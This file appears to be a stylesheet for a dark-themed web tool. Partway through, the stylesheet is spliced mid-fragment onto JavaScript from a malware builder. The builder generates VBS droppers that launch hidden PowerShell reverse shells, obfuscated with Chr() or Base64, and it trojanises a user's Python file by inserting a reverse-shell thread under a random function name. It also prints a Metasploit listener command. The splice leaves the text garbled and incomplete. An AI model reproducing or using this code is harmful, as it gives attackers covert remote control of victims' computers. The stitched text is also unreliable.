:root {
    --bg-dark: #0a0a12;
    --bg-darker: #050509;
    --primary: #5e00ff;
    --secondary: #00ff9d;
    --accent: #00b4ff;
    --danger: #ff00aa;
    --text: #e0e0e0;
    --text-muted: #888;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Consolas', 'Courier New', monospace;
}

body {
    background-color: var(--bg-dark);
    color: var(--text);
    min-height: 100vh;
    overflow-x: hidden;
}

.container {
    max-width: 800px;
    margin: 0 auto;
    padding: 2rem;
}

header {
    text-align: center;
    margin-bottom: 2rem;
    position: relative;
}

.title {
    color: var(--secondary);
    font-size: 2rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
    text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
    letter-spacing: 2px;
}

.author {
    background: linear-gradient(45deg, var(--accent), var(--secondary));
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    font-weight: bold;
    font-size: 1rem;
    margin-bottom: 1rem;
    display: inline-block;
    cursor: pointer;
    user-select: all;
}

.form-group {
    margin-bottom: 1.5rem;
}

.form-row {
    display: flex;
    align-items: center;
    margin-bottom: 1rem;
}

label {
    color: var(--accent);
    width: 150px;
    font-size: 0.9rem;
}

input[type="text"], 
input[type="number"],
textarea {
    background-color: var(--bg-dark);
    color: var(--secondary);
    border: 1px solid var(--primary);
    border-radius: 3px;
    padding: 0.8rem;
    flex: 1;
    font-size: 0.9rem;
    transition: all 0.3s ease;
}

input[type="text"]:focus, 
input[type="number"]:focus,
textarea:focus {
    outline: none;
    border-color: var(--secondary);
    box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.2);
}

textarea {
    min-height: 200px;
    resize: vertical;
    width: 100%;
}

.btn {
    background-color: transparent;
    color: var(--text);
    border: 2px solid;
    border-radius: 5px;
    padding: 0.8rem 1.5rem;
    font-size: 0.9rem;
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    margin-right: 1rem;
    margin-bottom: 1rem;
}

.btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: all 0.5s ease;
}

.btn:hover::before {
    left: 100%;
}

.btn-primary {
    border-color: var(--primary);
    color: var(--primary);
}

.btn-primary:hover {
    background-color: var(--primary);
    color: var(--bg-dark);
}

.btn-secondary {
    border-color: var(--secondary);
    color: var(--secondary);
}

.btn-secondary:hover {
    background-color: var(--secondary);
    color: var(--bg-dark);
}

.btn-accent {
    border-color: var(--accent);
    color: var(--accent);
}

.btn-accent:hover {
    background-color: var(--accent);
    color: var(--bg-dark);
}

.btn-group {
    display: flex;
    flex-wrap: wrap;
    margin: 1.5rem 0;
}

.output {
    margin-top: 1.5rem;
    background-color: var(--bg-darker);
    border: 1px solid var(--primary);
    border-radius: 5px;
    padding: 1rem;
    position: relative;
}

.output-title {
    color: var(--accent);
    margin-bottom: 0.5rem;
    font-size: 0.9rem;
}

.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 1000;
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.modal-content {
    background-color: var(--bg-dark);
    border: 1px solid var(--primary);
    border-radius: 5px;
    padding: 2rem;
    max-width: 500px;
    width: 90%;
    position: relative;
    animation: slideDown 0.3s ease;
}

@keyframes slideDown {
    from { transform: translateY(-50px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

.modal-title {
    color: var(--secondary);
    margin-bottom: 1rem;
    font-size: 1.2rem;
}

.modal-message {
    margin-bottom: 1.5rem;
    line-height: 1.5;
}

.modal-close {
    position: absolute;
    top: 1rem;
    right: 1rem;
    color: var(--text-muted);
    cursor: pointer;
    font-size: 1.5rem;
    transition: all 0.3s ease;
}

.modal-close:hover {
    color: var(--danger);
}

.modal-footer {
    display: flex;
    justify-content: flex-end;
}

.glow {
    animation: glow 2s infinite alternate;
}

@keyframes glow {
    from {
        text-shadow: 0 0 5px var(--secondary);
    }
    to {
        text-shadow: 0 0 15px var(--secondary), 0 0 20px var(--primary);
    }
}

@media (max-width: 768px) {
    .form-row {
        flex-direction: column;
        align-items: flex-start;
    }

    label {
        width: 100%;
        margin-bottom: 0.5rem;
    }

    .btn-group {
        flex-direction: column;
    }

    .btn {
        width: 100%;
        margin-right: 0;
        margin-bottom: 0.5rem;
    }
    }            "$writer.Flush()" +
            "}"
        );
    }
    
    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }
    
    document.getElementById('generate-chr').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        const file = vbsFileInput.files[0];
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        if (!file) {
            showModal('Error', 'Please specify output file', true);
            return;
        }
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            const vbs = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            const blob = new Blob([vbs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.name.endsWith('.vbs') ? file.name : `${file.name}.vbs`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            document.getElementById('vbs-output').value = `Successfully generated CHR method VBS:\n${file.name}\n\n${vbs}`;
            showModal('Success', 'VBS file created successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('generate-b64').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        const file = vbsFileInput.files[0];
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        if (!file) {
            showModal('Error', 'Please specify output file', true);
            return;
        }
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoder = new TextEncoder();
            const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
            const vbs = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
            );
            
            const blob = new Blob([vbs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.name.endsWith('.vbs') ? file.name : `${file.name}.vbs`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            document.getElementById('vbs-output').value = `Successfully generated Base64 method VBS:\n${file.name}\n\n${vbs}`;
            showModal('Success', 'VBS file created successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('inject-payload').addEventListener('click', async () => {
        const file = pyFileInput.files[0];
        const lhost = document.getElementById('msf-ip').value;
        const lport = parseInt(document.getElementById('msf-port').value);
        const outputDiv = document.getElementById('injector-output');
        
        if (!file) {
            showModal('Error', 'Please select a Python file', true);
            return;
        }
        
        if (!validateIpOrDomain(lhost)) {
            showModal('Error', 'Invalid LHOST', true);
            return;
        }
        
        if (!validatePort(lport)) {
            showModal('Error', 'LPORT must be between 1 and 65535', true);
            return;
        }
        
        try {
            outputDiv.innerHTML = '';
            
            const status = document.createElement('div');
            status.className = 'status status-info';
            status.innerHTML = '🔧 Creating Metasploit payload...';
            outputDiv.appendChild(status);
            
            const msfPayload = `import socket,subprocess,threading;def pty():
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("${lhost}",${lport}));
while 1:
    d=s.recv(1024);
    if len(d)==0:
        break
    p=subprocess.Popen(d.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);
    s.sendall(p.stdout.read()+p.stderr.read());
threading.Thread(target=pty,daemon=True).start()`;
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const original = e.target.result;
                const randomFn = Math.random().toString(36).substring(2, 10);
                
                const payloadFunc = [
                    `def ${randomFn}():\n`,
                    ...msfPayload.split('\n').map(line => `    ${line}\n`),
                    `\nthreading.Thread(target=${randomFn}, daemon=True).start()\n\n`
                ].join('');
                
                const finalCode = (
                    "import threading\n" +
                    payloadFunc +
                    original
                );
                
                const outputFilename = file.name.replace('.py', '_patched.py');
                const blob = new Blob([finalCode], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = outputFilename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                const success1 = document.createElement('div');
                success1.className = 'status status-success';
                success1.innerHTML = `✅ Payload successfully injected to '${outputFilename}'`;
                outputDiv.appendChild(success1);
                
                const success2 = document.createElement('div');
                success2.className = 'status status-info';
                success2.innerHTML = '➡️ Run Metasploit listener: msfconsole -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST ' + lhost + '; set LPORT ' + lport + '; exploit"';
                outputDiv.appendChild(success2);
                
                showModal('Success', 'Payload injected successfully!');
            };
            reader.readAsText(file);
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
});
